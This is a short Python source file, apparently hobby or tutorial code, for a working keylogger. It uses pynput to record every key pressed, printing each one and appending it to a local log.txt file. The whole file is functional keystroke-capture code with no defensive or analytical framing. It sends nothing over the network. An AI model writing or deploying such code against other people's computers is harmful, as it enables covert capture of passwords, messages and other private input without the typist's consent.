import pynput.keyboard

class SimpleKeylogger:
    def __init__(self):
        self.logger = ""

    def append_to_log(self, key_strike):
        self.logger = self.logger + key_strike
        try:
            with open("log.txt", "a+", encoding="utf-8") as new_file:
                new_file.write(self.logger)
                new_file.flush()  # Ensure the buffer is flushed to the file
            print(f"Written to file: {self.logger}")
        except Exception as e:
            print(f"Error writing to file: {e}")
        self.logger = ""

    def evaluate_keys(self, key):
        try:
            Pressed_key = str(key.char)
        except AttributeError:
            if key == key.space:
                Pressed_key = " "
            else:
                Pressed_key = " " + str(key) + " "
        print(f"Key pressed: {Pressed_key}")  # Debugging statement
        self.append_to_log(Pressed_key)

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.evaluate_keys)
        with keyboard_listener:
            self.logger = ""
            keyboard_listener.join()

if __name__ == "__main__":
    keylogger = SimpleKeylogger()
    keylogger.start()
